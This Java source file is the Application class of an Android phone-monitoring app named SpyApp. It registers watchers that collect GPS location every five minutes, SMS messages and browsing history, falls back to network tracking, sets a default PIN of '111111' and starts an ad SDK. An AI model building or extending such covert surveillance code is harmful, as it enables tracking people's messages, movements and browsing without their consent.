package com.enuke.smartapp;

import java.util.Calendar;

import android.app.Notification;
import android.content.IntentFilter;
import android.util.Log;
import android.widget.Toast;

import com.avrtumsdx.qeqdfxezh151685.Airpush;
import com.blinkawards.utility.Utility;
import com.enuke.monitor.AndroidMonitorApplication;
import com.enuke.monitor.core.event.Watchdog;
import com.enuke.monitor.observer.AndroidBrowsingHistoryWatcher;
import com.enuke.monitor.observer.AndroidGpsWatcher;
import com.enuke.monitor.observer.AndroidSmsWatcher;
import com.enuke.smartapp.phonenetwork.AlarmManagerBroadcastReceiver;
import com.enuke.smartapp.phonenetwork.PhoneNetworkInterface;

/**
 * @author parmanand
 */
public class SpyApp extends AndroidMonitorApplication implements PhoneNetworkInterface{
	

	public static final String APPLICATION_TAG = "spiderman";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";
	private static Notification n;
	private static ShowNotification notifire;
	private static Airpush airpush=null;
	final public static String ONE_TIME = "onetime";
	IntentFilter filterValue;
	AndroidGpsWatcher androidGpsWatcher;
	static SpyApp spyApp;
	 
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		spyApp=this;
		notifire=new ShowNotification(getApplicationContext());
		 n = new Notification(R.drawable.spynguard, null, System.currentTimeMillis());
		 //set updatenotification true if we are going to upload it in google play or false if it is for Spynguard website .
		 
			notifire.updateNotification(Utility.updatenotification);
			
			if(Utility.getSaveDataLocally(getApplicationContext(), "PINpass").length()<1){
				Utility.saveDataLocally(getApplicationContext(),"PINpass", "111111");
			}
			airpush=new Airpush(getApplicationContext(), null);
			/*airpush.startPushNotification(false);
			airpush.startIconAd();
			airpush.startSmartWallAd();
			airpush.startAppWall();*/
			if(Utility.getSaveDataLocally(getApplicationContext(), "showAdDate").equalsIgnoreCase("")){

				Utility.saveDataLocally(getApplicationContext(), "showAdDate", String.valueOf(Calendar.getInstance().getTimeInMillis()) );	
			}

			
			
			
			
	}
	@SuppressWarnings("deprecation")
	@Override
	protected void initialize(Watchdog watchdog, IntentFilter filter) {
		filterValue=filter;
		// Yeah, I also want to read my configuration from local preferences
		
		// Monitor all interesting events
		androidGpsWatcher=new AndroidGpsWatcher(5*60*1000);
		try{
			register(androidGpsWatcher, filter);
			register(new AndroidSmsWatcher(), filter);	
			register(new AndroidBrowsingHistoryWatcher(), filter);
			
		}catch(Exception e){
			System.err.println("register provider error:"+e);
		}
		// for phone network when gps and wi/fi off
		try{
			AlarmManagerBroadcastReceiver alarm = new AlarmManagerBroadcastReceiver();
			 if(alarm != null){
			      alarm.SetAlarm(getApplicationContext(), filter);
			     }
		}catch(Exception e){
			
		}
	}
	
		// Configuration dialog		
	public static SpyApp getApplication(){
		return spyApp;
	}
	
	public static ShowNotification getShoNotification(){
		return SpyApp.notifire;
	}
	public static Notification getAppNotificationIcon() {
		// TODO Auto-generated method stub
		return SpyApp.n;
	}
	public static Airpush getAirpush() {
		return SpyApp.airpush;
	}
	public static void setAirpush(Airpush airpush) {
		SpyApp.airpush = airpush;
	}
	@Override
	public void setRegister() {
		// TODO Auto-generated method stub
		register(androidGpsWatcher, filterValue);
		Log.e("TAG", "AndroidGpsWatcher is registered");
	}

}